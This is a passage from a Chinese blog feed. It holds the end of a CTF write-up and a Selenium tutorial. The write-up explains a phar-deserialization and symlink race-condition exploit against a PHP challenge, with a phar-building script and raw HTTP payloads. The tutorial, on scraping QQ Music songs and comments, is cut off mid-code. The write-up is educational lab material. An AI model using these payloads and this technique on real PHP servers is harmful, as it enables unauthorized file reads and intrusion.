class="string">&quot;/copyflag&quot;</span>); <span class="comment">//以root权限复制/flag 到 /tmp/flag.txt，并chown www-data:www-data /tmp/flag.txt</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;SFTQL&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;copyflag();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filewrite</span>(<span class="params"><span class="variable">$file</span>,<span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">        unlink(<span class="variable">$file</span>);</span><br><span class="line">        file_put_contents(<span class="variable">$file</span>, <span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;png&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;png&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/:|phar|\/\/|php/im&quot;</span>,<span class="variable">$filename</span>))&#123;</span><br><span class="line">        <span class="variable">$f</span> = fopen(<span class="variable">$filename</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">        <span class="variable">$contents</span> = fread(<span class="variable">$f</span>, filesize(<span class="variable">$filename</span>));</span><br><span class="line">        <span class="keyword">if</span>(strpos(<span class="variable">$contents</span>,<span class="string">&quot;flag&#123;&quot;</span>) !== <span class="literal">false</span>)&#123;</span><br><span class="line">            filewrite(<span class="variable">$filename</span>,<span class="string">&quot;Don&#x27;t give me flag!!!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$flag</span> = (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$flag</span> == <span class="string">&quot;Give me flag&quot;</span>) &#123;</span><br><span class="line">            filewrite(<span class="string">&quot;/tmp/flag.txt&quot;</span>, <span class="string">&quot;Don&#x27;t give me flag&quot;</span>);</span><br><span class="line">            sleep(<span class="number">2</span>);</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;no no no !&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            filewrite(<span class="string">&quot;/tmp/flag.txt&quot;</span>, <span class="variable">$flag</span>);  <span class="comment">//不给我看我自己写个flag。</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$head</span> = <span class="string">&quot;uploads/head.png&quot;</span>;</span><br><span class="line">        unlink(<span class="variable">$head</span>);</span><br><span class="line">        <span class="keyword">if</span> (symlink(<span class="variable">$filename</span>, <span class="variable">$head</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;成功更换头像&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            unlink(<span class="variable">$filename</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;非正常文件，已被删除&quot;</span>;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来就是漫长的坐牢过程，我盯着这源码研究了好久好久，硬是没找出来它漏洞在哪儿，刚开始思路是这样的，首先肯定先得上传一个<code>phar</code>文件，触发之后让它把<code>flag</code>内容写入到<code>/tmp/flag.txt</code>，这时候<code>/tmp/flag.txt</code>里面是正确的flag内容，然后利用<code>symlink</code>函数让<code>/tmp/flag.txt</code>和<code>uploads/head.png</code>之间建立软链接，访问头像的时候就正好可以看到<code>/tmp/flag.txt</code>，我们就拿到flag了</p><p>当然，这是理想情况，实施起来却非常有难度，首先，在哪里触发<code>phar</code>反序列化嘞，<code>fopen</code>肯定是不行的，因为上面过滤掉了<code>phar</code>，这种是绕不过去的，所以说只能往下看，最下面那个<code>unlink</code>是可以触发的，那么问题又来了，我们怎么进入到<code>unlink</code>喃，正常情况下都会进入到<code>if</code>，显示出成功更换头像，怎么让它报错进入到<code>else</code>喃，这里就需要用到条件竞争了，当两个文件已经生成软链接的时候，假如再让它们生成，它们就会报错进入到<code>else</code>，但这利用正常逻辑是没办法做到的，因为每一次生成之前它都有一次<code>unlink($head);</code>，所以说就利用条件竞争，在它们还没来得及删掉的时候，另外一个进程访问它让它报错进入到<code>else</code></p><p>好了，在这种情况下，我们成功触发了<code>phar</code>反序列化，并且将正确的<code>flag</code>内容写入到了<code>/tmp/flag.txt</code>中，那么接下来一个问题就是，我们怎么想办法读到正确的flag内容呢？按照正常逻辑，我们得传入一个<code>flag</code>的值，但无论这个<code>flag</code>的值是什么，这个<code>/tmp/flag.txt</code>的内容都将被改写，我们都没有办法读到正确的flag的内容，所以说这里就又需要用到条件竞争了，赶在它还没有写进去之前，抢着与正确的<code>/tmp/flag.txt</code>建立软链接，这时候头像就是正确的flag的值了，当然这肯定是一瞬间的，在后面又会被改掉，所以说需要批量发包获取头像，捕获那一瞬间，就能拿到真正的flag</p><p>所以说总结一下上面的，我们需要三个进程，第一个进程疯狂触发<code>phar</code>反序列化，第二个进程疯狂建立软链接，第三个进程疯狂读取头像的值，当你次数足够的多，运气足够的好，这三个进程撞到一起了的时候，flag就出了</p><p>先看看phar文件，这个贼简单：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">flag</span></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> flag();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;das.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; startBuffering();</span><br><span class="line"><span class="variable">$phar</span> -&gt; setStub(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; setMetadata(<span class="variable">$a</span>); </span><br><span class="line"><span class="variable">$phar</span> -&gt; addFromString(<span class="string">&quot;test.txt&quot;</span>,<span class="string">&quot;testaaa&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>生成phar文件传上去就行，在跑的过程中如果出现下面这个页面就说明<code>phar</code>文件没有问题：</p><p><img src="https://s2.loli.net/2022/04/24/WAyetoklPJVcL3j.png" alt="image.png"></p><p>照理说这种应该能写python多线程脚本的，只不过本人编程能力有限，这里就用<code>burp</code>来代替了，三个进程的<code>payload</code>如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">The First:</span><br><span class="line">POST /edit.php</span><br><span class="line">png=phar://uploads/1bb92ea10c5d93a6a8cecbb98eb48598.png&amp;flag=flag%7Bx%7D</span><br><span class="line">The Second:</span><br><span class="line">POST /edit.php</span><br><span class="line">png=/tmp/flag.txt&amp;flag=flag%7Bx%7D</span><br><span class="line">The Third:</span><br><span class="line">GET /uploads/head.png</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/24/6RhFyPafIrOMDSX.png" alt="image.png"></p><p>跑了一万五千次，总算是跑出来了，一万五千次才三个足以看出它概率有多小，所以说小伙伴们稍安勿躁嗷，<code>payload</code>没问题就慢慢跑</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;2022DASCTF-X-FATE-四月挑战赛&quot;&gt;&lt;a href=&quot;#2022DASCTF-X-FATE-四月挑战赛&quot; class=&quot;headerlink&quot; title=&quot;2022DASCTF X FATE 四月挑战赛&quot;&gt;&lt;/a&gt;2022DASCTF X FATE 四月挑战赛&lt;/h1&gt;&lt;p&gt;麻了麻了又是坐牢的一天，太难了现在的比赛呜呜呜，比赛中还是只打出了一道web，第二道web又是思路清晰但又是没做出来，第三道是&lt;code&gt;java&lt;/code&gt;题目前水平估计还做不出来就先放放，那就复现复现前两道吧&lt;/p&gt;</summary>
    
    
    
    
    <category term="ctf" scheme="https://arsenetang.github.io/tags/ctf/"/>
    
    <category term="Web安全" scheme="https://arsenetang.github.io/tags/Web%E5%AE%89%E5%85%A8/"/>
    
    <category term="wp" scheme="https://arsenetang.github.io/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>python篇之利用selenium库爬取qq音乐歌曲及评论</title>
    <link href="https://arsenetang.github.io/2022/04/12/python%E7%AF%87%E4%B9%8B%E5%88%A9%E7%94%A8selenium%E5%BA%93%E7%88%AC%E5%8F%96qq%E9%9F%B3%E4%B9%90%E6%AD%8C%E6%9B%B2%E5%8F%8A%E8%AF%84%E8%AE%BA/"/>
    <id>https://arsenetang.github.io/2022/04/12/python%E7%AF%87%E4%B9%8B%E5%88%A9%E7%94%A8selenium%E5%BA%93%E7%88%AC%E5%8F%96qq%E9%9F%B3%E4%B9%90%E6%AD%8C%E6%9B%B2%E5%8F%8A%E8%AF%84%E8%AE%BA/</id>
    <published>2022-04-11T16:00:00.000Z</published>
    <updated>2022-04-14T02:56:01.501Z</updated>
    
    <content type="html"><![CDATA[<h1 id="利用selenium库爬取qq音乐歌曲及评论"><a href="#利用selenium库爬取qq音乐歌曲及评论" class="headerlink" title="利用selenium库爬取qq音乐歌曲及评论"></a>利用selenium库爬取qq音乐歌曲及评论</h1><p>最近学校<code>python</code>课布置了两个爬虫实验，想着爬虫对我还挺重要的，就去学了学然后把这两个实验写了，接下来就来总结总结第二个实验也就是用<code>selenium</code>库来爬取qq音乐中的歌曲及评论</p><span id="more"></span><h2 id="1-selenium库是啥"><a href="#1-selenium库是啥" class="headerlink" title="1.selenium库是啥"></a>1.selenium库是啥</h2><p><code>Selenium</code>库是用来进行对网站进行自动化测试的一个工具，模拟浏览器真实操作的，所以说我们可以利用它来做爬虫，获取网页的信息，也能模拟鼠标或键盘，执行一些点击或输入的操作，相当于你用浏览器做的任何事情，用这个库都能很好的实现，我们这里是用python3来安装selenium库</p><h2 id="2-selenium库及浏览器驱动的安装"><a href="#2-selenium库及浏览器驱动的安装" class="headerlink" title="2.selenium库及浏览器驱动的安装"></a>2.selenium库及浏览器驱动的安装</h2><p>在python中安装<code>selenium</code>库：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip/pip3 install selenium</span><br></pre></td></tr></table></figure><p>这里有个注意事项就是现在最新版的<code>selenium</code>的版本都是4.x的版本，但是网上教程中的代码很多都是用3.x的版本写的，这两个版本不同还是有一些细微的差别的，所以说建议大家还是用3的版本写，到了4总有一些玄学问题，就很离谱</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip/pip3 uninstall selenium</span><br><span class="line">pip/pip3 install selenium=3.141.0</span><br></pre></td></tr></table></figure><p>我下面的代码还是建议用3的版本来跑，用4来跑可能会有玄学问题</p><p>然后就是安装浏览器的驱动，各大浏览器都有，这里我拿chrome来举例，下载链接：<a href="https://chromedriver.storage.googleapis.com/index.html">https://chromedriver.storage.googleapis.com/index.html</a>，找到相应版本安装即可，在浏览器的设置里面可以看到浏览器的版本哈，这个驱动的作用就是<code>selenium</code>库通过加载这个驱动来打开一个浏览器的窗口；下载解压之后得到一个<code>exe</code>文件，放到<code>chrome</code>浏览器的安装目录下，我的的是<code>C:\Program Files\Google\Chrome\Application</code></p><p><img src="https://s2.loli.net/2022/04/12/hILGUcqv6TZVJeB.png" alt="image.png"></p><p>测试代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line">driver=webdriver.Chrome(executable_path=<span class="string">&quot;C:\Program Files\Google\Chrome\Application\chromedriver.exe&quot;</span>)</span><br></pre></td></tr></table></figure><p>如果打开了一个浏览器的窗口，就成功了</p><h2 id="3-webdriver对象中的方法"><a href="#3-webdriver对象中的方法" class="headerlink" title="3.webdriver对象中的方法"></a>3.webdriver对象中的方法</h2><p>前面我们创建了一个<code>webdriver</code>对象，后面我们的操作都是基于这个对象的，先来看看打开一个网址：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#2.打开QQ音乐 -某歌手页面</span></span><br><span class="line">driver.get(<span class="string">&quot;https://y.qq.com/n/ryqq/singer/002J4UUk29y8BY&quot;</span>)<span class="comment">#薛之谦</span></span><br><span class="line"><span class="comment">#driver.get(&quot;https://y.qq.com/n/ryqq/singer/004Bjyj52RTYOj&quot;)#iu</span></span><br></pre></td></tr></table></figure><p>其实说写爬虫最重要的就是获取元素了，也就是说定位到我们想要的元素在哪儿，等找到之后无论是获取它的值还是点击啥的也就很好操作了</p><h3 id="元素定位的方法："><a href="#元素定位的方法：" class="headerlink" title="元素定位的方法："></a>元素定位的方法：</h3><h4 id="1-find-element-by-By-ID-value-quot-xxx-quot-和find-elements-by-By-TAG-NAME-value-quot-xxx-quot"><a href="#1-find-element-by-By-ID-value-quot-xxx-quot-和find-elements-by-By-TAG-NAME-value-quot-xxx-quot" class="headerlink" title="1.find_element(by=By.ID,value=&quot;xxx&quot;)和find_elements(by=By.TAG_NAME,value=&quot;xxx&quot;)"></a>1.<code>find_element(by=By.ID,value=&quot;xxx&quot;)</code>和<code>find_elements(by=By.TAG_NAME,value=&quot;xxx&quot;)</code></h4><p>这个是最简单的一种方法，因为一般元素的<code>id</code>值都是唯一的，我们可以直接通过这种方式定位到它，所以说当存在<code>id</code>值时用这个是最方便的，看下面这个例子：<a href="https://y.qq.com/n/ryqq/songDetail/001Qu4I30eVFYb">https://y.qq.com/n/ryqq/songDetail/001Qu4I30eVFYb</a></p><p><img src="https://s2.loli.net/2022/04/12/lifukJzwjWNEtMr.png" alt="image.png"></p><p>我们发现这里的歌词存在<code>id</code>参数，值为<code>lrc_content</code>，而本页中又没有其它id为<code>lrc_content</code>的元素了，所以说我们就可以直接获取整个元素</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">driver.find_element(by=By.ID,value=<span class="string">&quot;lrc_content&quot;</span>)</span><br></pre></td></tr></table></figure><p>随后我们又发现在这个元素下面又存在很多的<code>&lt;p&gt;</code>标签，歌词内容都是在<code>&lt;p&gt;</code>标签下的，所以说这里用一种新的方法<code>find_elements(by=By.TAG_NAME,value=&quot;p&quot;)</code>所以说合在一起就是<code>driver.find_element(by=By.ID,value=&quot;lrc_content&quot;).find_elements(by=By.TAG_NAME,value=&quot;p&quot;)</code>这里注意看清楚<code>element</code>和<code>elements</code>哈，一个是返回单个的标签对象，一个是返回标签对象的列表，然后可以通过<code>.text</code>获取该标签下的文字，获取歌词的完整代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.by <span class="keyword">import</span> By</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line">driver=webdriver.Chrome(executable_path=<span class="string">&quot;C:\Program Files\Google\Chrome\Application\chromedriver.exe&quot;</span>)</span><br><span class="line">driver.get(<span class="string">&quot;https://y.qq.com/n/ryqq/songDetail/001Qu4I30eVFYb&quot;</span>)</span><br><span class="line">driver.find_element(by=By.PARTIAL_LINK_TEXT, value=<span class="string">&quot;[展开]&quot;</span>).click()</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">lyic = <span class="string">&quot;&quot;</span></span><br><span class="line">lyic_box = driver.find_element(by=By.ID,value=<span class="string">&quot;lrc_content&quot;</span>).find_elements(by=By.TAG_NAME,value=<span class="string">&quot;p&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> lyic_box:</span><br><span class="line">    <span class="keyword">if</span> l.text != <span class="string">&quot;&quot;</span>:</span><br><span class="line">        lyic += l.text + <span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="built_in">print</span>(lyic)</span><br></pre></td></tr></table></figure><p>这里还有一个考点，就是获取完整歌词需要先点击展开，那我们就得先定位到展开在哪里，要点击的一般都用到<code>By.PARTIAL_LINK_TEXT</code>，<code>partial_link_text</code>是对超链接载体的模糊匹配，后面跟上<code>.click()</code>就是点击它了</p><h4 id="2-find-elements-by-By-XPATH-value-39-xxx-39"><a href="#2-find-elements-by-By-XPATH-value-39-xxx-39" class="headerlink" title="2.find_elements(by=By.XPATH, value=&#39;xxx&#39;)"></a>2.<code>find_elements(by=By.XPATH, value=&#39;xxx&#39;)</code></h4><p>接下来我认为是最重要的两种方法，首先是:<code>find_elements(by=By.XPATH, value=&#39;xxx&#39;)</code>，这种方法是通过<code>XPATH</code>语法去爬取元素</p><p>在<code>xpath</code>语法中，整个HTML文档根节点用<code>&#39;/&#39;</code>表示，如果我们想选择的是根节点下面的html节点，则可以在搜索框输入<code>/html</code></p><p>如果输入下面的表达式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/html/body/div</span><br></pre></td></tr></table></figure><p>这个表达式表示选择html下面的body下面的div元素，这种方式是绝对路径，接下来看看相对路径：</p><p><code>xpath</code>如果要表示相对路径的话，需要在前面加上<code>//</code>，表示从当前节点往下寻找所有的后代元素，不管它在什么位置，比如说<code>//div</code>，表示任意位置下的<code>div</code>标签；比如说要选择所有的 div 元素里面的所有的 p 元素 ，不管div 在什么位置，也不管p元素在div下面的什么位置，则可以这样写 <code>//div//p</code></p><p>还有一些其它用法参考：<code>https://www.byhy.net/tut/auto/selenium/xpath_1/</code>，不过我的爬虫中基本上没用到</p><h4 id="3-find-elements-by-By-CLASS-NAME-value-quot-xxx-quot"><a href="#3-find-elements-by-By-CLASS-NAME-value-quot-xxx-quot" class="headerlink" title="3.find_elements(by=By.CLASS_NAME, value=&quot;xxx&quot;)"></a>3.<code>find_elements(by=By.CLASS_NAME, value=&quot;xxx&quot;)</code></h4><p>除了根据元素的id ，我们还可以根据元素的 <code>class</code> 属性选择元素，只不过这个有的时候不好用是因为有太多重复的了，他不唯一就很难用</p><p><img src="https://s2.loli.net/2022/04/12/8EM6wZjvtfuNBUg.png" alt="image.png"></p><p>像这个歌名，它的值为<code>data__name_txt</code>，是唯一的，我们就可以这样用：<code>find_element(by=By.CLASS_NAME, value=&quot;data__name_txt&quot;)</code>，然后再加上<code>.text</code>就把它的值获取到了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.by <span class="keyword">import</span> By</span><br><span class="line">driver=webdriver.Chrome(executable_path=<span class="string">&quot;C:\Program Files\Google\Chrome\Application\chromedriver.exe&quot;</span>)</span><br><span class="line">driver.get(<span class="string">&quot;https://y.qq.com/n/ryqq/songDetail/001Qu4I30eVFYb&quot;</span>)</span><br><span class="line">song_name = driver.find_element(by=By.CLASS_NAME, value=<span class="string">&quot;data__name_txt&quot;</span>).text</span><br><span class="line"><span class="built_in">print</span>(song_name)</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/12/AWlmvtGu4KEJcYk.png" alt="image.png"></p><h4 id="4-get-attribute-‘xxx’"><a href="#4-get-attribute-‘xxx’" class="headerlink" title="4.get_attribute(‘xxx’)"></a>4.get_attribute(‘xxx’)</h4><p>还有一个就是<code>get_attribute(&#39;xxx&#39;)</code>，这个是用来获取该标签中的属性值</p><p><img src="https://s2.loli.net/2022/04/12/XqHjOJQWZGV69mF.png" alt="image.png"></p><p>比如说我们要获取这个<code>href</code>属性中的值，就可以用<code>get_attribute(&#39;href&#39;)</code>，只不过前面得定位到这个标签哈，这里我用的是<code>xpath</code>定位法，定位到<code>div</code>标签下的<code>span</code>标签下的<code>a</code>标签里面，用相对路径就是<code>//div/span/a</code>，所以说完整代码就是：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.by <span class="keyword">import</span> By</span><br><span class="line"></span><br><span class="line">driver=webdriver.Chrome(executable_path=<span class="string">&quot;C:\Program Files\Google\Chrome\Application\chromedriver.exe&quot;</span>)</span><br><span class="line">driver.get(<span class="string">&quot;https://y.qq.com/n/ryqq/singer/002J4UUk29y8BY&quot;</span>)<span class="comment">#薛之谦</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> link <span class="keyword">in</span> driver.find_elements(by=By.XPATH,value=<span class="string">&#x27;//div/span/a&#x27;</span>):</span><br><span class="line">    url = link.get_attribute(<span class="string">&#x27;href&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> (url):</span><br><span class="line">        <span class="built_in">print</span>(url)</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/12/XYWBQuhATmik2et.png" alt="image.png"></p><p>这样子就获取到了每一首歌曲的url</p><h2 id="4-完整代码"><a href="#4-完整代码" class="headerlink" title="4.完整代码"></a>4.完整代码</h2><p>前置知识差不多就这么多，我的代码中也只用到了这几种方法，当然肯定还有很多其它方法哈，这里就不细讲了，其实爬虫的核心就是定位元素，定位到想要的元素之后执行操作就好，可以获取它的值或者点击它啥的；定位元素方法也很多，主要就是我上面讲的几种方法，最重要的就是找到元素的唯一特征，然后用相应的方法定位就行了，如果有多种方法都能定位到就尽量选简单的嘛</p><p>差不多把前面的知识看完，再加上有python的基础就能写出爬虫了，如果还有啥疑问可以参考：<a href="https://www.byhy.net/tut/auto/selenium/01/">https://www.byhy.net/tut/auto/selenium/01/</a></p><p>b站上面也有白月黑羽的视频，讲的挺好的，如果看文章不爽也可以去看视频嗷：<a href="https://www.bilibili.com/video/BV1Z4411o7TA?p=1">https://www.bilibili.com/video/BV1Z4411o7TA?p=1</a></p><p>我写的完整代码如下，可能还会有一些bug啥的，但我已经尽力在排了呜呜呜，薛之谦和iu的歌应该是没啥bug的，如果发现其他歌手有啥bug的可以私聊我嗷：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.by <span class="keyword">import</span> By</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#  Author : Arsene.Tang</span></span><br><span class="line"><span class="comment">#  Date : 2022-04-03</span></span><br><span class="line"><span class="comment">#  爬取某个最热门五首歌曲的基本信息，歌词，前五百条热门评论</span></span><br><span class="line"><span class="comment">#  此代码仅供交流学习使用</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#1.创建Chrome浏览器对象，这会在电脑上在打开一个浏览器窗口</span></span><br><span class="line">driver=webdriver.Chrome(executable_path=<span class="string">&quot;C:\Program Files\Google\Chrome\Application\chromedriver.exe&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#2.打开QQ音乐 -某歌手页面</span></span><br><span class="line">driver.get(<span class="string">&quot;https://y.qq.com/n/ryqq/singer/002J4UUk29y8BY&quot;</span>)<span class="comment">#薛之谦</span></span><br><span class="line"><span class="comment">#driver.get(&quot;https://y.qq.com/n/ryqq/singer/004Bjyj52RTYOj&quot;)#iu</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#3.新建表格文件 这里注意编码格式需要是UTF-8-sig</span></span><br><span class="line">csv_file = <span class="built_in">open</span>(<span class="string">&#x27;QQMusic.csv&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,newline=<span class="string">&#x27;&#x27;</span>,encoding=<span class="string">&#x27;UTF-8-sig&#x27;</span>)</span><br><span class="line">writer 